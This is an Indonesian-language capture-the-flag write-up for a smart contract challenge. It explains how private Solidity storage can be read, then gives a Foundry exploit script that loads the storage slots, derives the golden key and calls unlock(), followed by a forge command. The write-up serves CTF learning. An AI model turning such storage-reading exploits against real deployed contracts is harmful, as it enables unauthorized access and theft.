# Solution
Goal dari challenge ini adalah mengganti `locked` menjadi `false`  menggunakan `unlock()` dengan memberikan kunci yang benar. Kunci tersebut terkonstruksi dari kompinasi yang tersimpan di state variable `combinations` yang merupakan dynamic array dengan visibility `private` jadi kita tidak bisa mendapatkan nilai tersebut secara langsung dengan memanggil variablenya. Untuk state variable di smart contract itu disimpan pada contract storage dan untuk dynamic array dan mappings tersimpan menggunakan slot yang unik dengan rumus sebagai berikut:
`array` : 
```sol
bytes32(uint256(keccak256(abi.encode(uint256(slot)))) + index)
```
`mappings`:
```sol
bytes32(uint256(keccak256(abi.encode(key, uint256(slot)))))
```
Array `combinations` tersimpan di slot 0 menurut urutan di state variable dan mappings `golden_key` terdapat pada slot 1 
Untuk mendapatkan key dari mappingnya dapat menggunakan dikonstruksi menggunakan nilai-nilai dari `combinations`:
```sol
address(uint160(combination1 >> 86 | combination2))
```
Kemudian tinggal panggil `unlock()` dengan kunci yang diperoleh sebagai argumen.
Berikut script foundry untuk solve challenge ini:
`ChestHack.s.sol`:
```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

interface Setup {
    function TARGET() external view returns (Chest);
}

interface Chest {
    function unlock(uint256 _key) external;
}

contract Solve is Script {
    Chest target;
    Setup setup = Setup(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0); // Setup address
    address player;

    function setUp() external payable {
        // Private key
        player = vm.addr(
            0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
        );
        vm.startBroadcast(player);
    }

    function run() external {
        target = Chest(setup.TARGET());
        bytes32 startSlot = keccak256(abi.encode(uint256(0)));
        uint256 combination1 = uint256(
            vm.load(address(target), bytes32(uint256(startSlot)))
        );
        uint256 combination2 = uint256(
            vm.load(address(target), bytes32(uint256(startSlot) + 1))
        );

        console2.log("Combination 1: ", combination1);
        console2.log("Combination 2: ", combination2);
        address key = address(uint160((combination1 >> 86) | combination2));
        bytes32 slotKey = keccak256(abi.encode(key, uint256(1)));
        uint256 golden_key = uint256(vm.load(address(target), slotKey));
        console2.log("Golden key: ", golden_key);
        target.unlock(golden_key);

        vm.stopBroadcast();
    }
}
```
```bash
forge script script/ChestHack.s.sol:Solve --broadcast --rpc-url <RPC_URL> --private-key <PRIVATE_KEY> 
```
